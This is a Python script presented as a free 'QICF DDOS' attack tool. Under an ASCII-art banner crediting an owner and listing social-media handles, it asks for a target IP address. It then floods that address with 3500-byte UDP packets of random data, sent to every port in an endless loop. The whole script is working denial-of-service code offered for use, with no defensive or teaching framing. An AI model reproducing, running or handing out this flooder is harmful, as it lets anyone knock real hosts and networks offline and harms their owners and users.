# QICF DDOS TOLL
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'
y="\033[1;33m"
g="\033[1;32m"
white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")

# আপনার দেওয়া স্টাইলে TAMIM UCS ব্যানার
# r""" ব্যবহার করা হয়েছে যাতে স্ল্যাশগুলো এরর না দেয়
print(r"""   [1;36m
 /$$$$$$$$ /$$$$$$  /$$      /$$ /$$ /$$      /$$       /$$   /$$  /$$$$$$   /$$$$$$ 
|__  $$__/ /$$__  $$| $$$    /$$$|__/| $$$    /$$$      | $$  | $$ /$$__  $$ /$$__  $$
   | $$   | $$  \ $$| $$$$  /$$$$ /$$| $$$$  /$$$$      | $$  | $$| $$  \__/| $$  \__/
   | $$   | $$$$$$$$| $$ $$/$$ $$| $$| $$ $$/$$ $$      | $$  | $$| $$      |  $$$$$$ 
   | $$   | $$__  $$| $$  $$$| $$| $$| $$  $$$| $$      | $$  | $$| $$       \____  $$
   | $$   | $$  | $$| $$\  $ | $$| $$| $$\  $ | $$      | $$  | $$| $$    $$ /$$  \ $$
   | $$   | $$  | $$| $$ \/  | $$| $$| $$ \/  | $$      |  $$$$$$/|  $$$$$$/|  $$$$$$/
   |__/   |__/  |__/|__/     |__/|__/|__/     |__/       \______/  \______/  \______/ 

[1;42m[1;37m            WELCOME TO QICF DDOS ATTACK          
[;0m[1;91m[1;92m

[1;31m••••••••••••••••••••••••••••••••••••••••••••••••••
[1;33m••••••••••••••••••••••••••••••••••••••••••••••••••

[1;32m [🔶] TOOL      [1;33m      : [1;96mDDOS Attack
[1;32m [🔶] STATUS          [1;33m: [1;96mFree 
[1;32m [🔶] TOOL OWNER      [1;33m: [1;96mTAMIM
[1;32m [🔶] FACEBOOK ID     [1;33m: [1;96mprinceborhan973
[1;32m [🔶] FACEBOOK PAGE   [1;33m: [1;96mqihtofficial
[1;32m [🔶] FACEBOOK GROUP  [1;33m: [1;96mqihtoriginal
[1;32m [🔶] GITHUB          [1;33m: [1;96mrahmatullahburhan
[1;32m [🔶] VERSION         [1;33m: [1;36m1.0.0

[1;33m••••••••••••••••••••••••••••••••••••••••••••••••••
[1;31m••••••••••••••••••••••••••••••••••••••••••••••••••
""")

ip = input(g+" [❗] Targeted IP :[31m ")
os.system("clear")
print(y+" Starting Attack With QICF DDOS Tool .......")
time.sleep(3)

try:
    while True:
        sent = 0
        for port in range(1, 65534):
            white.sendto(bytes, (ip, port))
            sent = sent + 1
            print("\033[1;91mSend \033[1;32m%s \033[1;36m Packets to \033[1;33m%s \033[1;35mThrough port \033[1;32m%s " % (sent, ip, port))
except KeyboardInterrupt:
    print("\n\033[1;92m DDOS Attack finished✅ \033[0m")
